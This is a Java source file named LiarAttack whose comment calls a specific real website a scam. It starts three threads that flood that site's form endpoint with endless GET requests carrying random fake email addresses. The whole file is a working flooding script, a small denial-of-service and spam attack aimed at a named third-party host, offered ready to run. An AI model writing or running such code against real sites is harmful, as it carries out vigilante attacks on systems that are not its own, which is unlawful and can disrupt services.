package MyTest;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.util.Random;
import java.util.concurrent.TimeUnit;

/**
 * description
 *http://singapore.xlwin.net/w13.php 是个骗子网站！！！
 * @author fangxueshun
 * @date 2017/9/1
 */
public class LiarAttack {
    public static void main(String[] args) throws Exception{
        OkHttpClient HTTP_CLIENT = new OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(90, TimeUnit.SECONDS)
                .build();
        Random random = new Random();
//        while (true){
            String[] mails = {"126","gmail","163","yeah","outlook"};
////            System.out.println(mails[random.nextInt(4)]);
//            System.out.println(getString(random.nextInt(10)));
//        }

        Thread thread1 = new Thread(new Runnable() {
            @Override
            public void run() {
                int i = 1;
                while (true){
                    Request request = new Request.Builder()
                            .url("http://singapore.xlwin.net/w13.php?v=2631&u=356576&tid=18073387&emailx="+random.nextInt(10)+"%40"+mails[random.nextInt(4)]+".com")
                            .get()
                            .addHeader("cache-control", "no-cache")
                            .addHeader("postman-token", "7dd6c6dc-c565-1e86-2cb1-ed67c5dc7d6d")
                            .build();
                    try {
                        Response response = HTTP_CLIENT.newCall(request).execute();
                        System.out.println("--------线程1返回码第"+i+"次请求返回码"+response.code());
                        response.code();
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    System.out.println("--------------线程1成功"+i);
                    i++;
                }
            }
        });
        Thread thread2 = new Thread(new Runnable() {
            @Override
            public void run() {
                int i = 1;
                while (true){
                    Request request = new Request.Builder()
                            .url("http://singapore.xlwin.net/w13.php?v=2631&u=356576&tid=18073387&emailx="+random.nextInt(10)+"%40"+mails[random.nextInt(4)]+".com")
                            .get()
                            .addHeader("cache-control", "no-cache")
                            .addHeader("postman-token", "7dd6c6dc-c565-1e86-2cb1-ed67c5dc7d6d")
                            .build();
                    try {
                        Response response = HTTP_CLIENT.newCall(request).execute();
                        System.out.println("--------线程2返回码第"+i+"次请求返回码"+response.code());
                        response.code();
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    System.out.println("--------------线程2成功"+i);
                    i++;
                }
            }
        });
        Thread thread3 = new Thread(new Runnable() {
            @Override
            public void run() {
                int i = 1;
                while (true){
                    Request request = new Request.Builder()
                            .url("http://singapore.xlwin.net/w13.php?v=2631&u=356576&tid=18073387&emailx="+random.nextInt(10)+"%40"+mails[random.nextInt(4)]+".com")
                            .get()
                            .addHeader("cache-control", "no-cache")
                            .addHeader("postman-token", "7dd6c6dc-c565-1e86-2cb1-ed67c5dc7d6d")
                            .build();
                    try {
                        Response response = HTTP_CLIENT.newCall(request).execute();
                        System.out.println("--------线程3返回码第"+i+"次请求返回码"+response.code());
                        response.code();
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    System.out.println("--------------线程3成功"+i);
                    i++;
                }
            }
        });
        thread1.start();
        thread2.start();
        thread3.start();
    }

    public static String getString(int length){
        if (length<1)
            length=5;
        String base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < length; i++) {
            int number = random.nextInt(base.length());
            sb.append(base.charAt(number));
        }
        return sb.toString();
    }
}

